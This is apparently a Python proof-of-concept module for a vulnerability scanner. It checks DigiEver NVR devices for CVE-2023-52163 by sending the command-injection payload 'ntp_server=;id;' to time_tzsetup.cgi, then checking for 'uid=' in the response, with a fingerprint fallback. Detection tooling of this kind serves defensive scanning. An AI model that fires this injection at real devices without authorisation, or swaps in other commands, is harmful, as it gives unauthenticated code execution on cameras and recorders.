import requests

from loguru import logger

from .base import POCTemplate


class CVE_2023_52163(POCTemplate):
    """DigiEver NVR Command Injection

    DigiEver DS-2105 Pro NVR devices are vulnerable to unauthenticated
    OS command injection via the ntp_server parameter in the
    /cgi-bin/time_tzsetup.cgi endpoint. This vulnerability has been
    actively exploited by Mirai-based botnets in the wild.
    CVSS 8.8 High.
    """

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['digiever']
        self.product_version = ''
        self.ref = """
        https://nvd.nist.gov/vuln/detail/CVE-2023-52163
        https://www.akamai.com/blog/security-research/digiever-fix-now-act-now-vulnerabilities
        """
        self.level = POCTemplate.level.high
        self.desc = """DigiEver NVR command injection via time_tzsetup.cgi endpoint.
        CVSS 8.8. Unauthenticated remote code execution through the ntp_server
        parameter. Actively exploited by Mirai botnet variants."""

    def verify(self, ip, port=80):
        """Check for vulnerable DigiEver NVR endpoints"""
        headers = self._get_headers()
        proxies = self._get_proxies()

        # Check the vulnerable time_tzsetup.cgi endpoint with a benign probe
        url = self._get_url(ip, port, '/cgi-bin/time_tzsetup.cgi')
        try:
            r = requests.post(
                url,
                headers=headers,
                proxies=proxies,
                data='ntp_server=;id;',
                verify=False,
                timeout=self.config.timeout,
                allow_redirects=False
            )
            if r.status_code == 200 and ('uid=' in r.text or 'root' in r.text):
                return ip, str(port), self.product, 'N/A', 'N/A', self.name
        except Exception as e:
            logger.error(e)

        # Check main page for DigiEver fingerprint
        url = self._get_url(ip, port, '/')
        try:
            r = requests.get(
                url,
                headers=headers,
                proxies=proxies,
                verify=False,
                timeout=self.config.timeout,
                allow_redirects=False
            )
            if r.status_code == 200 and 'DigiEver' in r.text:
                # Device is a DigiEver NVR, check if cgi endpoint is accessible
                cgi_url = self._get_url(ip, port, '/cgi-bin/time_tzsetup.cgi')
                try:
                    r2 = requests.get(
                        cgi_url,
                        headers=headers,
                        proxies=proxies,
                        verify=False,
                        timeout=self.config.timeout,
                        allow_redirects=False
                    )
                    if r2.status_code != 404:
                        return ip, str(port), self.product, 'N/A', 'N/A', self.name
                except Exception as e:
                    logger.error(e)
        except Exception as e:
            logger.error(e)

        return None

    def exploit(self, results):
        pass


POCTemplate.register_poc(CVE_2023_52163)
